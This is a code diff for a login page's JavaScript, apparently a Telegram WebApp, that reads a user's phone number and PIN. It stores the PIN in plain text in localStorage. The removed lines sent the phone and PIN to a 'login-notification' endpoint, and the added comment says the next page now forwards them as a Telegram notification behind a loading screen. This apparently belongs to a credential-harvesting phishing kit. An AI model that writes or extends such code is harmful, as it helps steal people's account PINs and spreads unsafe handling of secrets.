@@ -176,29 +176,21 @@ document.addEventListener("DOMContentLoaded", () => {
         eye.textContent = show ? "🫣" : "👁️";
     });
 
-    loginBtn.addEventListener('click', async () => {
+    loginBtn.addEventListener('click', () => {
         if (!savedPhone) return;
         
+        // Prevent accidental double clicks by disabling button instantly
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+
         let pin = "";
         pinBoxes.forEach(b => pin += b.value);
         localStorage.setItem('lastPin', pin);
 
         errorDisplay.style.display = "none";
 
-        try {
-            // Send login notification to your API in the background
-            fetch('/api/login-notification', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: savedPhone, pin: pin })
-            });
-            
-            // Move instantly to page7.html where your loading screen takes over
-            window.location.href = "/page7.html";
-        } catch (err) {
-            // Fallback redirect just in case
-            window.location.href = "/page7.html";
-        }
+        // Move instantly to page7.html (letting Page 7 fire the Telegram notification)
+        window.location.href = "/page7.html";
     });
 
     if (window.Telegram?.WebApp) {
